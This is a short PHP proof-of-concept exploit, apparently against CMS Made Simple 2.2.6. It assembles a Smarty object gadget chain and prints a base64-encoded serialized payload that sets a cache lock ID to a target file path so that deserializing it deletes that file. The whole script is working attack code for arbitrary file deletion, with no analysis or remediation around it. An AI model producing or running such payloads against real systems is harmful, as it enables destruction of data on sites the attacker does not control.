<?php
class Smarty {
	public $cache_locking = true;
	}

class Smarty_Template_Cached {
	public $is_locked = true;
	}

class Smarty_Internal_CacheResource_File {}
class Smarty_Internal_Template {}

function encode($obj) {
	return base64_encode(serialize($obj));
	}

function poc_chain($file_to_delete) {
	$obj = new Smarty_Internal_Template();
	$obj->smarty = new Smarty();
	$smarty_template_cached = new Smarty_Template_Cached();
	$smarty_template_cached->lock_id = $file_to_delete;
	$smarty_template_cached->handler = new Smarty_Internal_CacheResource_File();
	$obj->cached = $smarty_template_cached;
	return $obj;
	}


$file_to_delete = 'F:\tong\phpstudy\PHPTutorial\WWW\cmsmadesimple-2.2.6-install\test.txt';#file to delete,Absolute path
$chain = poc_chain($file_to_delete);
$payload = encode($chain);
echo $payload;exit;
?>